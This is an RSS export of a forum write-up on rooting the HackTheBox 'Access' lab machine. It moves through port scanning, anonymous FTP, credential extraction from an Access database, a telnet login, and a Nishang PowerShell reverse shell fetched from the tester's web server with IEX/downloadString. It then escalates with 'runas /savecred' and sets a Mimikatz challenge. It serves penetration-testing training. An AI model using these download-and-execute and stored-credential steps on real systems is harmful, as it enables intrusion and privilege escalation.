<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>[HTB] SHELL AFFECT - Access - WriteUp</title>
    <link>https://0x00sec.org/t/htb-shell-affect-access-writeup/13085</link>
    <description>![0x00sec-Access|690x225](upload://kD0LeZbyugt2GPuTsYWbBBZVt1f.png) 

Hey buddies!
How are you doing?

This time I will show you how to root the &#39;Access&#39; VM from [HackTheBox](https://hackthebox.eu).
Like other topics, I will focus on the methodology and the steps which were required to root the box on your own successfully.


# Table of contents

```
1. Port scanning
2. Port filtering
3. Service enumeration
4. FTP
5. Telnet
6. HTTP
7. Analyse Microsoft Access Database
8. ZIP File extraction
9. Telnet Login
10. Reverse Shell through PowerShell
11. Local enumeration
12. Privilege Escalation
13. Challenge
```

Let&#39;s begin.

## 1. Ping &amp; Port Scanning

As always, I like to start to scan the machine just for open ports. We need an overview of our target. Because we don&#39;t know how our target was configured, we should do small steps. So let us ping the machine.

&gt; ping -c 3 10.10.10.98

![grafik|546x189](upload://npPl0LnGiUMVz3ygWn2CRTOb8B6.png) 

Notice the TTL (Time-To-Live) is 127. But what is TTL?
Do some research and try to find out on your own.
**You should practice it!**


When you find the information you need, then you can go forward.
_But what do we need to know?_

This is a great question and to become better, and it&#39;s necessary to be able to find the solution on your own. So take a step back and create an overview for yourself. Also, you should ask yourself:
**What do I need?**
**What is my goal (for this part!)?**

It&#39;s always easy if you see the solution. Every machine looks pretty easy if you know how to root it. **The most difficult part of it is to find a way into it on your own.**
So do some research before you continue.
______

Some useful resources you should find are:

https://searchnetworking.techtarget.com/definition/time-to-live

https://www.netresec.com/?page=Blog&amp;month=2011-11&amp;post=Passive-OS-Fingerprinting

https://superuser.com/questions/620304/how-to-identify-which-os-is-running-at-remote-host/620521

Now we know that the OS is most likely a Windows.

Let us enumerate the open ports of this machine by using Nmap.
If you&#39;re not familiar with Nmap, you should do some research. It is an essential tool which the most Penetration Testers are using.

Resource: https://nmap.org/

&gt; nmap 10.10.10.98 -Pn -n -p- --open -oN allports.nmap --stats-every 30s --max-retries 2 -T5

![grafik|690x177](upload://vcW9OiWsbgOVAtJXSeU40t59HrS.png) 

Alright, what do we have so far?

- OS: Windows (most likely)
- FTP
- Telnet
- HTTP

## 2. Port filtering

It&#39;s possible that you will discover much more open ports on other machines and it could be a pain to type them manually. 
Let us filter these by using Bash.

&gt; cat allports.nmap | grep tcp | cut -d&quot;/&quot; -f1 | tr &quot;\n&quot; &quot;,&quot; | sed &#39;s/.$//g&#39;

If you don&#39;t understand the command, you can visit this site to get a better understanding of it: https://explainshell.com/

Now we can save the output of it in a variable.
&gt; PORTS=$(cat allports.nmap | grep tcp | cut -d&quot;/&quot; -f1 | tr &quot;\n&quot; &quot;,&quot; | sed &#39;s/.$//g&#39;)

To verify it looks great, we should &#39;echo&#39; it.
&gt; echo $PORTS

![grafik|689x33,100%](upload://jVY6I3GpQqNP8hmBzKLdZmvMXwv.png) 

And now we can proceed.

## 3. Service enumeration

Service enumeration is the part where we try to find out more information about the running services. Enumeration doesn&#39;t mean only to collect as much information as possible moreover you have to create an overview based on all the information you had received.

Let us use Nmap for service scan and the Nmap Scripting Engine (NSE) to collect more information about the running services.

&gt; nmap 10.10.10.98 -p$PORTS -sV -sC -oN services.nmap --stats-every 30s --max-retries 2

![grafik|690x60](upload://jTCQzQZ1Y9dO6tjiXHsdWsPTFrc.png) 

So here is how our results look like:

![grafik|690x240,75%](upload://t8DdB0WFIcBEG7sfgdGqBckNC0j.png) 

Look at the information we&#39;ve got so far closely.
Every information in this result is crucial for us. 
**You should append the info we just found out to our previous overview.**

You also should notice the Telnet line. Take a closer look at it. What exactly do you see there?

There is a question mark. Right. What could this mean?
**[Important] Train your research skills and try to find it out on your own.**

Sometimes it can be essential to search for information like this little thing.

## 4. FTP
Let us take a look at the FTP server. You should notice from the previous Nmap scan that we have &#39;Anonymous login allowed&#39;. So let&#39;s use it.

&gt; ftp 10.10.10.98

**Credentials:**
Name: _anonymous_
Password: _anon_

![grafik|635x275](upload://mZJMzyFhXGlZyBrYZudy9lK8JS1.png) 

By looking into these directories, we found some interesting files.

![grafik|530x282](upload://nVoYP9Z0W075yIoIKMU8eli772R.png) 

Now we have to download it. I will show you two different methods you can do it.
We can use FTP with the &#39;**get**&#39;  command, or we use &#39;**wget**&#39; to download these files.
But first, we have to still organised. So we create an FTP directory where we will store the files.

### GET command
![grafik|482x350](upload://aAcDVOrZZZ5XCAElMlL93iRm8MU.png) 

### WGET
![grafik|690x42](upload://1MHUra6RuhCWuf8txau4ne9Y4Km.png) 

You should read the manual of &#39;**wget**&#39; to understand the command and find out what **PASV** mode of an FTP server is.

Before we begin to analyse the files let us enumerate the other services too.

## 5. Telnet
Did you find out what the question mark means?
Now we will take a look at this service by using **telnet**.

&gt; telnet 10.10.10.98

![grafik|574x131](upload://vLYe2YRFzJKYq00tUyK6ogj1Mqx.png) 

You will notice that it will take a few seconds before the login prompt appears.
That is the reason for the question mark at the Nmap scan. Nmap couldn&#39;t determine this service as Telnet because the response took to long. But because Telnet is basically on TCP port 23 it gave us the output of _maybe_ it&#39;s Telnet.

We don&#39;t have any credentials to log in yet and to start bruteforcing this service just doesn&#39;t make sense without any information of the &#39;organisation&#39; or the machine we are trying to root. If we shouldn&#39;t find any useful information than we can try to bruteforce it, but now let us take a look at the Web server.

## 6. HTTP

First, we should just interact with the Web server. Let us visit it.

![grafik|680x500,75%](upload://8o5oG4rBdI1GW3ga93oLVRjAQwh.jpeg) 

Here we can download the image for later analysis.
Also, we want to know how the header looks like. Which &#39;**OPTIONS**&#39; are allowed?. 
The questions you should ask yourself:
- Are there some security headers? 
- What kind of security headers exists?

Again, train your research skills and learn new things. Use all search engines and methods you know to find out the information you don&#39;t know.

![grafik|690x321](upload://bcxc77Ki1E62gRfiDHbpSxlvGrz.png) 

From this point, we want to spider the Web server to find out which directories on it exist.
Therefore we will use **[Burp Suite](https://portswigger.net/burp)**.
After setting up our Proxy-Settings and configure our target in Burp we can send another GET request to the Web server and intercept it. By sending it to spider in Burp, it will hopefully find some useful files or directories.

![grafik|690x211](upload://8Dq19pl1HpT1Ei68rVvDwuT4CdS.jpeg) 

By clicking on **Action** you can send the request to Spider in Burp.
Burp Spider is a crawler which will be used to map a Web server ([learn more](https://www.hackingarticles.in/spider-web-applications-using-burpsuite/)).

Now our results look like we don&#39;t have much here:

![grafik|690x255,75%](upload://77hZBAzYbU7s2GLRgbMIfsIMytT.png) 

From here we can make another step and bruteforce the Web server with **GET** requests for different files and directories. There exist a lot of tools out there like **gobuster**, **dirbuster**, **dirb** and **dirsearch**.
At this example, I will use **dirsearch**. It isn&#39;t installed in Kali Linux by default. 
So [here](https://github.com/maurosoria/dirsearch) is the resource for dirsearch where you can download it.

You can download it by using the following command:
&gt; git clone https://github.com/maurosoria/dirsearch.git /opt/dirsearch/

Also, to make it globally executable you can create a symbolic link to ```/usr/local/bin/``` .
&gt; ln -s /opt/dirsearch/dirsearch.py /usr/local/bin/dirsearch

By typing:
&gt; dirsearch -h

you will see all the options it has. Now let us enumerate the Web server with it.

&gt; dirsearch -u http://10.10.10.98 \-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 10 --max-retries=2 -e html,jpg,png,xml,aspx,asp,htm,asmx,dll,db

![grafik|690x143](upload://7RuWVVn9LOCTrCSRoC1vfT5A1uJ.png) 

Unfortunately, nothing is interesting in the Web server. Another tool we can use is **nikto**.
This will provide us with a lot of information:

![grafik|690x376](upload://lQMGqHEbH96tcOJosyohsW5Hr1H.png) 
**You should always note all of the information we collected so far during the process.**

Let&#39;s move on.

## 7. Microsoft Access Database
At this point, we should determine the file types of the files we are working with.
This could be done with a tool called &#39;**file**&#39;.
&gt; file Access\ Control.zip
file backup.mdb

![grafik|653x74](upload://oFKRLpr9PwnqotSr2esdD9ObYim.png) 

Another method to find more information we can use &#39;**exiftool**&#39;.

### Access Control.zip

![grafik|688x359](upload://jz728AoAxc1ymVIJBblTuPkpNjv.png) 

### backup.mdb
![grafik|615x180](upload://gLjdOD3tIy5ZYkQMr81QhbIKP2i.png) 

Notice that &#39;**exiftool**&#39; couldn&#39;t determine the file type. So we have to do it manually.
&gt; Ok Google: mdb file

On the first result page, you will be able to find this URL: https://fileinfo.com/extension/mdb
It provides us with the information we need.

**I can&#39;t repeat it often enough: note it!**

Another question:
&gt; Ok, Google: extract mdb data kali

Here you will find a website called http://mdbtools.sourceforge.net/install/x53.htm.

By using &#39;**mdbtools**&#39; we can work with this file. Let us take a look at how it does look inside.
&gt; mdb-tables backup.mdb

![grafik|651x144,75%](upload://mMTOYKhPPnyKMgZGr8HHZrohRN7.png) 

Ok. We have to structure it to make it easily readable.
![grafik|690x265,75%](upload://ym704ti82tGun3kB9YpJbNoXFP.png) 

We see the ```auth_user``` table inside. Let&#39;s export the data from this table.
&gt; mdb-export backup.mdb auth_user | tr &quot;,&quot; &quot; &quot; | grep &quot;\\&quot;&quot; | cut -d&quot; &quot; -f2-3 | sed &#39;s/\\&quot;//g&#39; | tr &quot; &quot; &quot;:&quot;

![grafik|690x151](upload://5ZPlmUCwM4wn5m2cq2Ts8nMqREI.png) 

Also, we should save this information.
&gt; mdb-export backup.mdb auth_user | tr &quot;,&quot; &quot; &quot; | grep &quot;\\&quot;&quot; | cut -d&quot; &quot; -f2-3 | sed &#39;s/\\&quot;//g&#39; | tr &quot; &quot; &quot;:&quot; &gt; creds.txt

Another way we can use is the following:
&gt; mdb-export backup.mdb auth_user | tr &quot;,&quot; &quot; &quot; | column -t

![grafik|690x66](upload://8VcbppNJHWHdNDlqWLGWw9AHg0M.png) 

## 8. ZIP File extraction

Next file is our ZIP archive. We want to know what&#39;s inside of it.
&gt; unzip Access\ Control.zip

![grafik|668x56](upload://ek09gY0j45Ksyy83bOdYCQIHKBG.png) 

**Do some research. Find out why this error appears.**


&gt; 7z -e Access\ Control.zip

Now it&#39;s asking us for a password. Did we find some credentials already?
Let us try to use them:

![grafik|631x360,75%](upload://7vFiJfOvPXrHxua4nXPkzO9HPxN.png) 

We extracted a file called &#39;**Access Control.pst**&#39;. What kind of file is it?
&gt; file Access\ Control.pst

![grafik|659x147](upload://g1iAdc3tqeNWLb7gC0MM6KY3QfP.png) 

Find out a way on your own to read the content.
&gt; cat &#39;**Access Control.mbox**&#39; | head -n 25

![grafik|690x264](upload://UYFESOjrP65VDNDe8AVdUmMOG4.png) 


## 9. Telnet Login
At this point, we found other credentials which we can use.
Let us try to log in by using these.

&gt; telnet 10.10.10.98

![grafik|617x260,75%](upload://fxwyR6vnjzef9w1xjTOr8oo1ML3.png) 
We could successfully log in by using the credentials we found from the ZIP file.
Now it&#39;s time for local enumeration, but first, it&#39;s always better to work with a reverse shell.

**Make sure you understand how a reverse shell works because it&#39;s an essential part in this whole area.**


## 10. Reverse Shell through PowerShell

But before we can obtain a reverse shell we have to plan it, understand how it should work and how the whole scenario of it will look like.
**We have to force our target to connect back to us.** .._(cough) firewalls (cough)_...

What do we need:
1. Reverse shell script
2. Web server
3. Listener
4. Execution command

### 1. Reverse shell Script 

[Nishang](https://github.com/samratashok/nishang) created an excellent collection of different PowerShell scripts. One of these we will use to obtain our reverse shell. We will copy it to our working directory.

![grafik|690x224](upload://nmhDbrbwjRgPMsSjGKmyeJ7Tig6.png) 

We want to make sure that our target machine will execute it directly. Here we have to make some changes for that. By looking into the reverse shell script, we will see an example:

![grafik|690x256](upload://5izwQ0yPnhd0zz0smcr1DbqQVR4.png) 

We will copy this line at the end of the file and remove the &quot;PS &gt;&quot;. After these changes it will look like this:

![grafik|634x247](upload://wmw22j6XwBd603tSyICbh5yqBeP.png) 

### 2. Web server
There exist a lot of methods to share files. We will use this time a Python3 Web server module in the directory we stored our script.
&gt; python3 -m http.server 80


### 3. Listener
After that, we have to start our listener and listen on the port we set in the script before. In my case, it was the TCP port **2201**. Therefore I will use **Netcat**.

&gt; nc -nlvp 2201

### 4. Execution command
The execution command for this will be:
&gt; C:\Users\security&gt; powershell -c IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.5/revshell.ps1&#39;)

![grafik|690x218](upload://gr2bgjXYjgPskoOd9qRWOtvBV6r.png) 

## 11. Local enumeration
[411Hall](https://github.com/411Hall) created an awesome enumeration PowerShell script called [JAWS](https://github.com/411Hall/JAWS) to identify privilege escalation vectors quickly.
We will let our target system download and execute it the same way we did it with the reverse shell.

![grafik|690x352](upload://enKRcJDEplNR3msTwHFbl5ZRI0c.png) 

It will take a few minutes. So don&#39;t quit the session.
The most interesting part is this one:

![grafik|530x185](upload://kxMOInr5NJmUUAk2JZ3iNj6ePNX.png) 

Also, let us take a look at the desktop of the &#39;security&#39; user.
![grafik|518x180](upload://anLaTy4fsHRiGKPEmvwa69Xu9ad.png) 

So it seems we have here some stored credentials for the Administrator on this machine. 
**If we don&#39;t know how to export them what else could we do?**

## 12. Privilege Escalation
Let us ask Google:
&gt; Ok, Google: windows currently stored credentials privilege escalation

Also here on the first page, you will find a GitHub repository of [swisskyrepo](https://github.com/swisskyrepo) to his [Windows - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md) cheat sheet.
If we press **CTRL+F** and search for &quot;stored credentials&quot; you will see this example:

![grafik|690x276](upload://9WJPSqbNSQPJIWJzrG9FQ9XNiC.png) 
**Ok. Do we need an EXE file or can we do something else?**

What do you think about another reverse shell but this time with Administrator privileges?

Go back to **10. Reverse Shell through PowerShell** if you don&#39;t know how it does work or how it should look like. But I think this should be clear right now. It&#39;s the same scenario in this situation. 
1. We will just change the TCP port of our reverse shell script to **2202**.
2. Run our python web server.
3. Set up our listener on TCP port 2202.
4. Execute it the same way with PowerShell with the currently stored credentials.

### 1. Reverse Shell Script
![grafik|632x214](upload://dWDvdCdoT8SagPNtb6ABIwz9Agb.png) 

### 2. Web server
&gt; python3 -m http.server 80

### 3. Listener
&gt; nc -nlvp 2202

### 4. Execution command
&gt; PS C:\Users\security&gt; runas /savecred /user:ACCESS\Administrator &quot;powershell.exe IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.5/revshell.ps1&#39;)&quot;

![grafik|690x382](upload://oSGe4JuLtbOSyRlPw2n8K3J6vgR.png) 

## 12. Challenge

For this challenge, your goals will be
1. A **Meterpreter** session 
2. Upload Mimikatz and read the credentials

Restrictions:
1. The usage of **Empire** or their scripts for this challenge is forbidden.

Have fun!
____________
&gt; YouTube video coming soon! 

Best regards,
Cry0l1t3
[![logo|477x96](upload://5EBtqZQBcIDxRT3RlPHxV5GcRmg.png)](https://www.shell-affect.com) 

Official Website: https://www.shell-affect.com
Twitter: https://twitter.com/ShellAffect
Xing: https://www.xing.com/companies/shell-affect
YouTube: https://www.youtube.com/channel/UCgxyvJCaG1vRLM2GIpyBiWQ</description>
    
    <lastBuildDate>Thu, 18 Apr 2019 13:29:18 +0000</lastBuildDate>
    <category>Hackthebox Writeups</category>
    <atom:link href="https://0x00sec.org/t/htb-shell-affect-access-writeup/13085.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>[HTB] SHELL AFFECT - Access - WriteUp</title>
        <dc:creator><![CDATA[Cry0l1t3]]></dc:creator>
        <description><![CDATA[
            <p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/90946da6acbedac2668b6f64d716d8bac331d5e9.png" alt="0x00sec-Access" data-base62-sha1="kD0LeZbyugt2GPuTsYWbBBZVt1f" width="690" height="225"></p>
<p>Hey buddies!<br>
How are you doing?</p>
<p>This time I will show you how to root the ‘Access’ VM from <a href="https://hackthebox.eu" rel="noopener nofollow ugc">HackTheBox</a>.<br>
Like other topics, I will focus on the methodology and the steps which were required to root the box on your own successfully.</p>
<h1>Table of contents</h1>
<pre><code class="lang-auto">1. Port scanning
2. Port filtering
3. Service enumeration
4. FTP
5. Telnet
6. HTTP
7. Analyse Microsoft Access Database
8. ZIP File extraction
9. Telnet Login
10. Reverse Shell through PowerShell
11. Local enumeration
12. Privilege Escalation
13. Challenge
</code></pre>
<p>Let’s begin.</p>
<h2>1. Ping &amp; Port Scanning</h2>
<p>As always, I like to start to scan the machine just for open ports. We need an overview of our target. Because we don’t know how our target was configured, we should do small steps. So let us ping the machine.</p>
<blockquote>
<p>ping -c 3 10.10.10.98</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a41d6bb8fc06ceb3d5b6da4088d6765a818ae044.png" alt="grafik" data-base62-sha1="npPl0LnGiUMVz3ygWn2CRTOb8B6" width="546" height="189"></p>
<p>Notice the TTL (Time-To-Live) is 127. But what is TTL?<br>
Do some research and try to find out on your own.<br>
<strong>You should practice it!</strong></p>
<p>When you find the information you need, then you can go forward.<br>
<em>But what do we need to know?</em></p>
<p>This is a great question and to become better, and it’s necessary to be able to find the solution on your own. So take a step back and create an overview for yourself. Also, you should ask yourself:<br>
<strong>What do I need?</strong><br>
<strong>What is my goal (for this part!)?</strong></p>
<p>It’s always easy if you see the solution. Every machine looks pretty easy if you know how to root it. <strong>The most difficult part of it is to find a way into it on your own.</strong><br>
So do some research before you continue.</p>
<hr>
<p>Some useful resources you should find are:</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://searchnetworking.techtarget.com/favicon.ico" class="site-icon" width="256" height="256">
      <a href="https://searchnetworking.techtarget.com/definition/time-to-live" target="_blank" rel="noopener nofollow ugc">SearchNetworking</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e0f0e077d158921e77e8956b2ae5519fc3680e4a.png" class="thumbnail" width="" height="">

<h3><a href="https://searchnetworking.techtarget.com/definition/time-to-live" target="_blank" rel="noopener nofollow ugc">What is time-to-live (TTL)? - Definition from WhatIs.com</a></h3>

<p>Time-to-live (TTL) is a value in an Internet Protocol (IP) packet that limits the lifespan of a packet of data in a computer or network.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://www.netresec.com/favicon.ico" class="site-icon" width="128" height="128">
      <a href="https://www.netresec.com/?page=Blog&amp;month=2011-11&amp;post=Passive-OS-Fingerprinting" target="_blank" rel="noopener nofollow ugc">Netresec</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/8/82b545cb3027513a42f107454b8c5365eb8b409c.jpeg" class="thumbnail" width="" height="">

<h3><a href="https://www.netresec.com/?page=Blog&amp;month=2011-11&amp;post=Passive-OS-Fingerprinting" target="_blank" rel="noopener nofollow ugc">Passive OS Fingerprinting - NETRESEC Blog</a></h3>

<p>Network traffic from a computer can be analyzed to detect what operating system it is running. This is to a large extent due to differences in how the TCP/IP stack is implemented in various operating systems. We will in this blog post explain the...</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox stackexchange">
  <header class="source">
      <a href="https://superuser.com/questions/620304/how-to-identify-which-os-is-running-at-remote-host/620521#620521" target="_blank" rel="noopener nofollow ugc">superuser.com</a>
  </header>
  <article class="onebox-body">
      <a href="https://superuser.com/users/238360/ary" target="_blank" rel="noopener nofollow ugc">
    <img alt="Ary" src="https://0x00sec.s3.amazonaws.com/original/2X/e/e5c34b7de1c34f86a329c19b82e5307f4fee0450.png" class="thumbnail onebox-avatar" width="" height="">
  </a>
<h4>
  <a href="https://superuser.com/questions/620304/how-to-identify-which-os-is-running-at-remote-host/620521#620521" target="_blank" rel="noopener nofollow ugc">How to identify which OS is running at remote host?</a>
</h4>

<div class="tags">
  <strong>linux, windows</strong>
</div>

<div class="date">
  
  answered by
  <a href="https://superuser.com/users/238360/ary" target="_blank" rel="noopener nofollow ugc">
    Ary
  </a>
  on <a href="https://superuser.com/questions/620304/how-to-identify-which-os-is-running-at-remote-host/620521#620521" target="_blank" rel="noopener nofollow ugc">05:45PM - 16 Jul 13 UTC</a>
</div>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>Now we know that the OS is most likely a Windows.</p>
<p>Let us enumerate the open ports of this machine by using Nmap.<br>
If you’re not familiar with Nmap, you should do some research. It is an essential tool which the most Penetration Testers are using.</p>
<p>Resource: <a href="https://nmap.org/" rel="noopener nofollow ugc">https://nmap.org/</a></p>
<blockquote>
<p>nmap 10.10.10.98 -Pn -n -p- --open -oN allports.nmap --stats-every 30s --max-retries 2 -T5</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/dab9cc34a75a76bbc9f9d8e18e3b58daf35ce9d4.png" alt="grafik" data-base62-sha1="vcW9OiWsbgOVAtJXSeU40t59HrS" width="690" height="177"></p>
<p>Alright, what do we have so far?</p>
<ul>
<li>OS: Windows (most likely)</li>
<li>FTP</li>
<li>Telnet</li>
<li>HTTP</li>
</ul>
<h2>2. Port filtering</h2>
<p>It’s possible that you will discover much more open ports on other machines and it could be a pain to type them manually.<br>
Let us filter these by using Bash.</p>
<blockquote>
<p>cat allports.nmap | grep tcp | cut -d"/" -f1 | tr “\n” “,” | sed ‘s/.$//g’</p>
</blockquote>
<p>If you don’t understand the command, you can visit this site to get a better understanding of it: <a href="https://explainshell.com/" rel="noopener nofollow ugc">https://explainshell.com/</a></p>
<p>Now we can save the output of it in a variable.</p>
<blockquote>
<p>PORTS=$(cat allports.nmap | grep tcp | cut -d"/" -f1 | tr “\n” “,” | sed ‘s/.$//g’)</p>
</blockquote>
<p>To verify it looks great, we should ‘echo’ it.</p>
<blockquote>
<p>echo $PORTS</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8bb6d7ded72f512dbcb4d2e9fe7c36c88d5f0b3b.png" alt="grafik" data-base62-sha1="jVY6I3GpQqNP8hmBzKLdZmvMXwv" width="689" height="33"></p>
<p>And now we can proceed.</p>
<h2>3. Service enumeration</h2>
<p>Service enumeration is the part where we try to find out more information about the running services. Enumeration doesn’t mean only to collect as much information as possible moreover you have to create an overview based on all the information you had received.</p>
<p>Let us use Nmap for service scan and the Nmap Scripting Engine (NSE) to collect more information about the running services.</p>
<blockquote>
<p>nmap 10.10.10.98 -p$PORTS -sV -sC -oN services.nmap --stats-every 30s --max-retries 2</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8b730b25584fd9585403de71b487c73e9b935332.png" alt="grafik" data-base62-sha1="jTCQzQZ1Y9dO6tjiXHsdWsPTFrc" width="690" height="60"></p>
<p>So here is how our results look like:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/cc38db5d7423233d23447bbf430d6db6fa22a023.png" alt="grafik" data-base62-sha1="t8DdB0WFIcBEG7sfgdGqBckNC0j" width="517" height="180"></p>
<p>Look at the information we’ve got so far closely.<br>
Every information in this result is crucial for us.<br>
<strong>You should append the info we just found out to our previous overview.</strong></p>
<p>You also should notice the Telnet line. Take a closer look at it. What exactly do you see there?</p>
<p>There is a question mark. Right. What could this mean?<br>
<strong>[Important] Train your research skills and try to find it out on your own.</strong></p>
<p>Sometimes it can be essential to search for information like this little thing.</p>
<h2>4. FTP</h2>
<p>Let us take a look at the FTP server. You should notice from the previous Nmap scan that we have ‘Anonymous login allowed’. So let’s use it.</p>
<blockquote>
<p>ftp 10.10.10.98</p>
</blockquote>
<p><strong>Credentials:</strong><br>
Name: <em>anonymous</em><br>
Password: <em>anon</em></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a12a6ea8b6f29829576e12119753a0bc065c9309.png" alt="grafik" data-base62-sha1="mZJMzyFhXGlZyBrYZudy9lK8JS1" width="635" height="275"></p>
<p>By looking into these directories, we found some interesting files.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a7af24c49e0e93f27d3725a847a567c764a20095.png" alt="grafik" data-base62-sha1="nVoYP9Z0W075yIoIKMU8eli772R" width="530" height="282"></p>
<p>Now we have to download it. I will show you two different methods you can do it.<br>
We can use FTP with the ‘<strong>get</strong>’  command, or we use ‘<strong>wget</strong>’ to download these files.<br>
But first, we have to still organised. So we create an FTP directory where we will store the files.</p>
<h3>GET command</h3>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4a2d6b7179fdd8665c1664ea1768661359947f98.png" alt="grafik" data-base62-sha1="aAcDVOrZZZ5XCAElMlL93iRm8MU" width="482" height="350"></p>
<h3>WGET</h3>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0c83b4f4cbd167d4c09105f3c545883a98bc81fa.png" alt="grafik" data-base62-sha1="1MHUra6RuhCWuf8txau4ne9Y4Km" width="690" height="42"></p>
<p>You should read the manual of ‘<strong>wget</strong>’ to understand the command and find out what <strong>PASV</strong> mode of an FTP server is.</p>
<p>Before we begin to analyse the files let us enumerate the other services too.</p>
<h2>5. Telnet</h2>
<p>Did you find out what the question mark means?<br>
Now we will take a look at this service by using <strong>telnet</strong>.</p>
<blockquote>
<p>telnet 10.10.10.98</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/deaf9a6bf9b72867fead252950e576cbd813a655.png" alt="grafik" data-base62-sha1="vLYe2YRFzJKYq00tUyK6ogj1Mqx" width="574" height="131"></p>
<p>You will notice that it will take a few seconds before the login prompt appears.<br>
That is the reason for the question mark at the Nmap scan. Nmap couldn’t determine this service as Telnet because the response took to long. But because Telnet is basically on TCP port 23 it gave us the output of <em>maybe</em> it’s Telnet.</p>
<p>We don’t have any credentials to log in yet and to start bruteforcing this service just doesn’t make sense without any information of the ‘organisation’ or the machine we are trying to root. If we shouldn’t find any useful information than we can try to bruteforce it, but now let us take a look at the Web server.</p>
<h2>6. HTTP</h2>
<p>First, we should just interact with the Web server. Let us visit it.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3aca6e232f45dea5e79df2d7545269ca9422a2d1.jpeg" alt="grafik" data-base62-sha1="8o5oG4rBdI1GW3ga93oLVRjAQwh" width="510" height="375"></p>
<p>Here we can download the image for later analysis.<br>
Also, we want to know how the header looks like. Which ‘<strong>OPTIONS</strong>’ are allowed?.<br>
The questions you should ask yourself:</p>
<ul>
<li>Are there some security headers?</li>
<li>What kind of security headers exists?</li>
</ul>
<p>Again, train your research skills and learn new things. Use all search engines and methods you know to find out the information you don’t know.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4e82aabeff8dda42d561c90e52216022141c448d.png" alt="grafik" data-base62-sha1="bcxc77Ki1E62gRfiDHbpSxlvGrz" width="690" height="321"></p>
<p>From this point, we want to spider the Web server to find out which directories on it exist.<br>
Therefore we will use <strong><a href="https://portswigger.net/burp" rel="noopener nofollow ugc">Burp Suite</a></strong>.<br>
After setting up our Proxy-Settings and configure our target in Burp we can send another GET request to the Web server and intercept it. By sending it to spider in Burp, it will hopefully find some useful files or directories.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3c86210f17cb519c4b1a962ea4fb3fdd246da704.jpeg" alt="grafik" data-base62-sha1="8Dq19pl1HpT1Ei68rVvDwuT4CdS" width="690" height="211"></p>
<p>By clicking on <strong>Action</strong> you can send the request to Spider in Burp.<br>
Burp Spider is a crawler which will be used to map a Web server (<a href="https://www.hackingarticles.in/spider-web-applications-using-burpsuite/" rel="noopener nofollow ugc">learn more</a>).</p>
<p>Now our results look like we don’t have much here:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/31e22f2d5e3b9e01f3f700b8d986193220026345.png" alt="grafik" data-base62-sha1="77hZBAzYbU7s2GLRgbMIfsIMytT" width="517" height="191"></p>
<p>From here we can make another step and bruteforce the Web server with <strong>GET</strong> requests for different files and directories. There exist a lot of tools out there like <strong>gobuster</strong>, <strong>dirbuster</strong>, <strong>dirb</strong> and <strong>dirsearch</strong>.<br>
At this example, I will use <strong>dirsearch</strong>. It isn’t installed in Kali Linux by default.<br>
So <a href="https://github.com/maurosoria/dirsearch" rel="noopener nofollow ugc">here</a> is the resource for dirsearch where you can download it.</p>
<p>You can download it by using the following command:</p>
<blockquote>
<p>git clone <a href="https://github.com/maurosoria/dirsearch.git" rel="noopener nofollow ugc">https://github.com/maurosoria/dirsearch.git</a> /opt/dirsearch/</p>
</blockquote>
<p>Also, to make it globally executable you can create a symbolic link to <code>/usr/local/bin/</code> .</p>
<blockquote>
<p>ln -s /opt/dirsearch/dirsearch.py /usr/local/bin/dirsearch</p>
</blockquote>
<p>By typing:</p>
<blockquote>
<p>dirsearch -h</p>
</blockquote>
<p>you will see all the options it has. Now let us enumerate the Web server with it.</p>
<blockquote>
<p>dirsearch -u <a href="http://10.10.10.98" rel="noopener nofollow ugc">http://10.10.10.98</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 10 --max-retries=2 -e html,jpg,png,xml,aspx,asp,htm,asmx,dll,db</p>
</blockquote>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/371b64a94d6063f9a9e199832c4ee41d8b5b2005.png" alt="grafik" data-base62-sha1="7RuWVVn9LOCTrCSRoC1vfT5A1uJ" width="690" height="143"></p>
<p>Unfortunately, nothing is interesting in the Web server. Another tool we can use is <strong>nikto</strong>.<br>
This will provide us with a lot of information:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/99252aed170009ac618550eaa08006cebded110d.png" alt="grafik" data-base62-sha1="lQMGqHEbH96tcOJosyohsW5Hr1H" width="690" height="376"><br>
<strong>You should always note all of the information we collected so far during the process.</strong></p>
<p>Let’s move on.</p>
<h2>7. Microsoft Access Database</h2>
